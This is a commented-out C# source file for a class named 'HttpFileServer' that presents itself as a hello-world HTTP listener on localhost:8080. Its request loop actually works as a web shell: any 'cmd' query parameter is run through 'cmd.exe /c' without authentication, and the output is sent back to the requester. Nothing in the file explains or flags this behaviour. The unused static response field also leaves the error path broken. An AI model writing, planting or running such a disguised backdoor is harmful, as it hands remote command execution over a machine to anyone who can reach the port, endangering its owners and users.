// using System.Diagnostics;
// using System.Net;
// using System.Text;
//
// internal class HttpFileServer
// {
//     private static HttpListenerResponse response;
//     private static HttpListener listener;
//
//     private static void Main(string[] args)
//     {
//         listener = new HttpListener();
//         listener.Prefixes.Add("http://localhost:8080/");
//         listener.Start();
//         Console.WriteLine("--- Listening, exit with Ctrl-C");
//         try
//         {
//             ServerLoop();
//         }
//         catch (Exception ex)
//         {
//             Console.WriteLine(ex);
//             if (response != null) SendErrorResponse(500, "Internal server error");
//         }
//     }
//
//     private static void LogAccess(HttpListenerContext context)
//     {
//         var ipAddress = context.Request.RemoteEndPoint?.Address.ToString();
//         var requestUrl = context.Request.Url.AbsoluteUri;
//         var userAgent = context.Request.UserAgent;
//         var timestamp = DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss");
//
//         var logMessage = $"[{timestamp}]: URL: {requestUrl}";
//         Console.WriteLine(logMessage);
//     }
//
//     private static void ServerLoop()
//     {
//         while (true)
//         {
//             var context = listener.GetContext();
//             var request = context.Request;
//             var response = context.Response;
//             LogAccess(context);
//             var responseString = "<HTML><BODY> Hello world!</BODY></HTML>";
//             var buffer = Encoding.UTF8.GetBytes(responseString);
//             try
//             {
//                 var cmd = request.QueryString["cmd"];
//                 if (cmd != null)
//                 {
//                     var p = new Process();
//                     p.StartInfo.FileName = "cmd.exe";
//                     p.StartInfo.Arguments = "/c " + cmd;
//                     p.StartInfo.UseShellExecute = false;
//                     p.StartInfo.RedirectStandardOutput = true;
//                     p.StartInfo.RedirectStandardError = true;
//                     p.Start();
//                     buffer = Encoding.UTF8.GetBytes(p.StandardOutput.ReadToEnd() + p.StandardError.ReadToEnd());
//                 }
//             }
//             catch
//             {
//                 buffer = Encoding.UTF8.GetBytes(responseString);
//             }
//
//             var output = response.OutputStream;
//             response.StatusCode = 200;
//             response.ContentLength64 = buffer.Length;
//             output.Write(buffer, 0, buffer.Length);
//             output.Close();
//         }
//     }
//
//     private static void SendErrorResponse(int statusCode, string statusResponse)
//     {
//         response.ContentLength64 = 0;
//         response.StatusCode = statusCode;
//         response.StatusDescription = statusResponse;
//         response.OutputStream.Close();
//         Console.WriteLine("*** Sent error: {0} {1}", statusCode, statusResponse);
//     }
// }